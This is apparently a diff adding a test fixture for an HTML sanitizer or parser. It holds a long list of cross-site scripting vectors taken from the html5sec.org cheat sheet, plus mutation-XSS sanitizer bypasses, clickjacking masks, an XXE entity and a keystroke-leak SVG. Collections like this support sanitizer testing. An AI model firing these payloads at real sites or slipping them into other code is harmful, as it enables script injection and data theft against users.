+        \\<option><style></option></select><b><img src=x onerror=alert(1)></style></option>
+        \\
+        \\<option><iframe></select><b><script>alert(1)</script>
+        \\
+        \\</iframe></option>
+        \\
+        \\<b><style><style/><img src=x onerror=alert(1)>
+        \\
+        \\<b><style><style////><img src=x onerror=alert(1)></style>
+        \\
+        \\<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
+        \\  <mrow>
+        \\    <menclose notation="box"><mi>a</mi></menclose><mo>,</mo>
+        \\    <menclose notation="box"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
+        \\    <menclose notation="box" mathcolor="#FF0000"><mi>a</mi></menclose><mo>,</mo>
+        \\    <menclose notation="box" mathbackground="#80FF80"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
+        \\    <menclose notation="box" mathcolor="#FF0000" mathbackground="#80FF80"><mi>a</mi></menclose><mo>,</mo>
+        \\    <menclose notation="box"><mi mathbackground="#80FF80">a</mi></menclose>
+        \\  </mrow>
+        \\</math>
+        \\
+        \\<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>
+        \\
+        \\<a href="javascript:alert(1)">@shafigullin<a>
+        \\
+        \\<image name=activeElement><svg onload=alert(1)>
+        \\
+        \\<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>
+        \\
+        \\<div onmouseout="javascript:alert(/superevr/)" x=yscript: n>@superevr</div>
+        \\
+        \\<button remove=me onmousedown="javascript:alert(1);" onclick="javascript:alert(1)" >@giutro
+        \\
+        \\<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>
+        \\
+        \\<isindex x="javascript:" onmouseover="alert(1)" label="variation of bypass by @giutro">
+        \\
+        \\<div wow=removeme onmouseover=alert(1)>text
+        \\
+        \\<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>
+        \\
+        \\<isindex src="javascript:" onmouseover="alert(1)" label="bypass by @giutro" />
+        \\
+        \\<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>
+        \\
+        \\<form action="javasc
+        \\ript:alert(1)"><button>XXX</button></form>
+        \\
+        \\<div id="1"><form id="foobar"></form><button form="foobar" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div>
+        \\
+        \\<div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div>
+        \\
+        \\<div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div>
+        \\
+        \\<div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div>
+        \\
+        \\<div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div>
+        \\
+        \\<div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div>
+        \\
+        \\<div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div>
+        \\
+        \\<div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div>
+        \\
+        \\<div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div>
+        \\
+        \\<div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div>
+        \\
+        \\<div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div>
+        \\
+        \\<div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div>
+        \\
+        \\<div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div>
+        \\
+        \\<div id="18"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div>
+        \\
+        \\<div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div>
+        \\
+        \\<div id="23"><form id=foobar onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'`-->]]>]</div>
+        \\
+        \\<div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src="x"onerror=alert(24)>`>//["'`-->]]>]</div>
+        \\
+        \\<div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div>
+        \\
+        \\<div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div>
+        \\
+        \\<div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div><div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src="."onerror=alert(28)>>//["'`-->]]>]</div>
+        \\
+        \\<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`-->]]>]</div>
+        \\
+        \\<div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'`-->]]>]</div>
+        \\
+        \\<div id="31"><frameset onload=alert(31)>//["'`-->]]>]</div>
+        \\
+        \\<div id="32"><table background="javascript:alert(32)"></table>//["'`-->]]>]</div>
+        \\
+        \\<div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'`-->]]>]</div>
+        \\
+        \\<div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div>
+        \\
+        \\<div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div>
+        \\
+        \\<div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'`-->]]>]</div>
+        \\
+        \\<div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'`-->]]>]</div>
+        \\
+        \\<div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["'`-->]]>]</div><div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
+        \\
+        \\<![><img src="]><img src=x onerror=alert(39)//">
+        \\
+        \\<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
+        \\<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
+        \\
+        \\<div id="41"><li style=list-style:url() onerror=alert(41)></li>
+        \\
+        \\<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>
+        \\
+        \\<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div>
+        \\
+        \\<div id="43"><?xml version="1.0" standalone="no"?>
+        \\
+        \\<html xmlns="http://www.w3.org/1999/xhtml">
+        \\<head>
+        \\<style type="text/css">
+        \\@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
+        \\</style>
+        \\</head>
+        \\<body>Hello</body>
+        \\</html>//["'`-->]]>]</div>
+        \\
+        \\<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div>
+        \\
+        \\<div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div>
+        \\
+        \\<div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div>
+        \\
+        \\<div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div>
+        \\
+        \\<div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div>
+        \\
+        \\<div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div>
+        \\
+        \\<div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div>
+        \\
+        \\<div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div><div id="53"><xml id="xss" src="test.htc"></xml>
+        \\
+        \\<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
+        \\
+        \\<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div>
+        \\
+        \\<div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div>
+        \\
+        \\<div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div>
+        \\
+        \\<div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div>
+        \\
+        \\<div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
+        \\
+        \\<div id="62"><!-- IE 6-8 -->
+        \\<x '="foo"><x foo='><img src=x onerror=alert(62)//'>
+        \\<!-- IE 6-9 -->
+        \\<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
+        \\<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>
+        \\
+        \\<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
+        \\<img src="javascript:alert(2)">
+        \\<image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓
+        \\<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
+        \\
+        \\<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div>
+        \\
+        \\<div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div><div id="66"><?xml version="1.0"?>
+        \\
+        \\<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
+        \\<root/>//["'`-->]]>]</div>
+        \\<div id="67"><!DOCTYPE x [
+        \\    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"
+        \\ onerror CDATA "alert(67)"
+        \\ onload CDATA "alert(2)">
+        \\]><img />//["'`-->]]>]</div>
+        \\
+        \\<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">
+        \\    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>
+        \\</doc>//["'`-->]]>]</div>
+        \\
+        \\<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div>
+        \\
+        \\<div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div>
+        \\
+        \\<div id="71"><// style=x:expression8alert(71)9>//["'`-->]]>]</div>
+        \\
+        \\<div id="72"><form><button formaction="javascript:alert(72)">X</button>//["'`-->]]>]</div>
+        \\
+        \\<div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div>
+        \\
+        \\<div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["'`-->]]>]</div>
+        \\
+        \\<div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div>
+        \\
+        \\<div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'`-->]]>]</div>
+        \\
+        \\<div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div>
+        \\
+        \\<div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div>
+        \\
+        \\<div id="79"><object allowscriptaccess="always" data="x"></object>//["'`-->]]>]</div>
+        \\
+        \\<div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div>
+        \\
+        \\<div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div>
+        \\
+        \\<div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div><div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
+        \\
+        \\<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div>
+        \\
+        \\<div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div>
+        \\
+        \\<div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div><div id="87"><svg xmlns="http://www.w3.org/2000/svg">
+        \\<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
+        \\<set attributeName="onmouseover" to="alert(89)"/>
+        \\<animate attributeName="onunload" to="alert(89)"/>
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="90"><!-- Up to Opera 10.63 -->
+        \\<div style=content:url(test2.svg)></div>
+        \\
+        \\<!-- Up to Opera 11.64 - see link below -->
+        \\
+        \\<!-- Up to Opera 12.x -->
+        \\<div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
+        \\
+        \\<div id="91">[A]
+        \\<? foo="><script>alert(91)</script>">
+        \\<! foo="><script>alert(91)</script>">
+        \\</ foo="><script>alert(91)</script>">
+        \\[B]
+        \\<? foo="><x foo='?><script>alert(91)</script>'>">
+        \\[C]
+        \\<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
+        \\[D]
+        \\<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
+        \\
+        \\<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
+        \\
+        \\<div id="93"><div style="list-style:url(http://foo.f)url(javascript:alert(93));">X</div>//["'`-->]]>]</div>
+        \\
+        \\<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
+        \\<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+        \\<feImage>
+        \\<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,
+        \\PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
+        \\</feImage>
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
+        \\<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>
+        \\
+        \\<div id="97"><!-- IE 5-9 -->
+        \\<div id=d><x xmlns="><iframe onload=alert(97)"></div>
+        \\<script>d.innerHTML+='';</script>
+        \\<!-- IE 10 in IE5-9 Standards mode -->
+        \\<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
+        \\<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="98"><div id=d><div style="font-family:'sansFAAFB colorAredB'">X</div></div>
+        \\<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="99">XXX<style>
+        \\
+        \\*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
+        \\
+        \\<!--
+        \\--><!--*{color:red}   /* all UA */
+        \\
+        \\*{background:url(xx //**/
+        \\ed/*)} /* IE 6-7 Standards mode */
+        \\
+        \\</style>//["'`-->]]>]</div>
+        \\
+        \\<div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div>
+        \\
+        \\<div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div><div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
+        \\<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div>
+        \\
+        \\<div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div>
+        \\
+        \\<div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
+        \\
+        \\<div id="108"><!-- IE 5-8 standards mode -->
+        \\<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx onerror=alert(108)></a>">
+        \\<!-- IE 5-9 standards mode -->
+        \\<!a foo=x=`y><img alt="`><img src=xx onerror=alert(2)//">
+        \\<?a foo=x=`y><img alt="`><img src=xx onerror=alert(3)//">//["'`-->]]>]</div>
+        \\
+        \\<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
+        \\<a id="x"><rect fill="white" width="1000" height="1000"/></a>
+        \\<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
+        \\<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
+        \\
+        \\<div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="113"><div id="x">XXX</div>
+        \\<style>
+        \\
+        \\#x{font-family:foo[bar;color:green;}
+        \\
+        \\#y];color:red;{}
+        \\
+        \\</style>//["'`-->]]>]</div>
+        \\
+        \\<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div><div id="115"><!--[if]><script>alert(115)</script -->
+        \\<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>
+        \\
+        \\<div id="116"><div id="x">x</div>
+        \\<xml:namespace prefix="t">
+        \\<import namespace="t" implementation="#default#time2">
+        \\<t:set attributeName="innerHTML" targetElement="x" to="<imgsrc=xonerror=alert(116)>">//["'`-->]]>]</div>
+        \\
+        \\<div id="117"><a href="http://attacker.org">
+        \\    <iframe src="http://example.org/"></iframe>
+        \\</a>//["'`-->]]>]</div>
+        \\
+        \\<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">
+        \\    <h1>Drop me</h1>
+        \\</div>
+        \\<iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>
+        \\
+        \\<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>
+        \\
+        \\<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
+        \\
+        \\<div id="120"><script>
+        \\function makePopups(){
+        \\    for (i=1;i<6;i++) {
+        \\        window.open('popup.html','spam'+i,'width=50,height=50');
+        \\    }
+        \\}
+        \\</script>
+        \\<body>
+        \\<a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
+        \\
+        \\<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
+        \\xmlns:svg="http://www.w3.org/2000/svg">
+        \\<body style="background:gray">
+        \\<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
+        \\<svg:svg>
+        \\<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
+        \\    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>
+        \\    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>
+        \\</svg:mask>
+        \\</svg:svg>
+        \\</body>
+        \\</html>//["'`-->]]>]</div>
+        \\
+        \\<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
+        \\
+        \\<div id="123"><span class=foo>Some text</span>
+        \\<a class=bar href="http://www.example.org">www.example.org</a>
+        \\<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
+        \\<script>
+        \\$("span.foo").click(function() {
+        \\alert('foo');
+        \\$("a.bar").click();
+        \\});
+        \\$("a.bar").click(function() {
+        \\alert('bar');
+        \\location="http://html5sec.org";
+        \\});
+        \\</script>//["'`-->]]>]</div>
+        \\
+        \\<div id="124"><script src="/example.comoo.js"></script> // Safari 5.0, Chrome 9, 10
+        \\<script src="\example.comoo.js"></script> // Safari 5.0//["'`-->]]>]</div>
+        \\
+        \\<div id="125"><?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
+        \\<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>
+        \\
+        \\<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
+        \\<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
+        \\<handler id="y">alert(127)</handler>
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="128"><svg><style><img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
+        \\
+        \\<div id="129"><svg><image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
+        \\<!--
+        \\Same effect with
+        \\<image filter='...'>
+        \\-->
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="130"><math href="javascript:alert(130)">CLICKME</math>
+        \\<math>
+        \\<!-- up to FF 13 -->
+        \\<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>
+        \\
+        \\<!-- FF 14+ -->
+        \\<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
+        \\</math>//["'`-->]]>]</div>
+        \\
+        \\<div id="132"><!doctype html>
+        \\<form>
+        \\<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
+        \\<br>
+        \\<input name="secret" type="password">
+        \\</form>
+        \\<!-- injection --><svg height="50px">
+        \\<image xmlns:xlink="http://www.w3.org/1999/xlink">
+        \\<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
+        \\<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
+        \\<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
+        \\<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
+        \\</image>
+        \\</svg>//["'`-->]]>]</div>
+        \\
+        \\<div id="133"><!-- `<img/src=xxx onerror=alert(133)//--!>//["'`-->]]>]</div>
+        \\
+        \\<div id="134"><xmp>
+        \\<%
+        \\</xmp>
+        \\<img alt='%></xmp><img src=xx onerror=alert(134)//'>
+        \\
+        \\<script>
+        \\x='<%'
+        \\</script> %>/
+        \\alert(2)
+        \\</script>
+        \\
+        \\XXX
+        \\<style>
+        \\*['<!--']{}
+        \\</style>
+        \\-->{}
+        \\*{color:red}</style>//["'`-->]]>]</div>
+        \\
+        \\<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
+        \\<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
+        \\<template match="/">
+        \\<eval>new ActiveXObject('htmlfile').parentWindow.alert(135)</eval>
+        \\<if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
+        \\</template>
+        \\</stylesheet>//["'`-->]]>]</div>
+        \\
+        \\<div id="136"><form action="x" method="post">
+        \\<input name="username" value="admin" />
+        \\<input name="password" type="password" value="secret" />
+        \\<input name="injected" value="injected" dirname="password" />
+        \\<input type="submit">
+        \\</form>//["'`-->]]>]</div>
+        \\
+        \\<div id="137"><svg>
+        \\<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
+        \\<circle r="400"></circle>
+        \\<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
+        \\</a>//["'`-->]]>]</div>
+        \\
+        \\<input name=submit>123
+        \\
+        \\<input name=acceptCharset>123
+        \\
+        \\<form><input name=hasChildNodes>
+        \\
+        \\<img src="small.jpg" srcset="medium.jpg 1000w, large.jpg 2000w">
+        \\
+        \\<div inert></div>
+        \\
+        \\<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>
+        \\
+        \\<svg></p><title><a id="</title><img src=x onerror=alert()>"></textarea></svg>
+        \\
+        \\<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>
+        \\
+        \\<svg></p><title><template><style></title><img src=x onerror=alert(1)>
+        \\
+        \\<math></br><textarea><mtext><template><style></textarea><img src=x onerror=alert(1)>
+        \\
+        \\<form><input name=namespaceURI>
+        \\
+        \\<svg></p><math><title><style><img src=x onerror=alert(1)></style></title>
+        \\
+        \\<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
+        \\
+        \\<svg><foreignobject><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>
+        \\
+        \\<math><annotation-xml encoding="text/html"><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>
+        \\
+        \\<xmp><svg><b><style><b title='</style><img>'>
+        \\
+        \\<noembed><svg><b><style><b title='</style><img>'>
+        \\
+        \\<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert(1)>
+        \\
+        \\<math><mtext><table><mglyph><style><math href=javascript:alert(1)>CLICKME</math>
+        \\
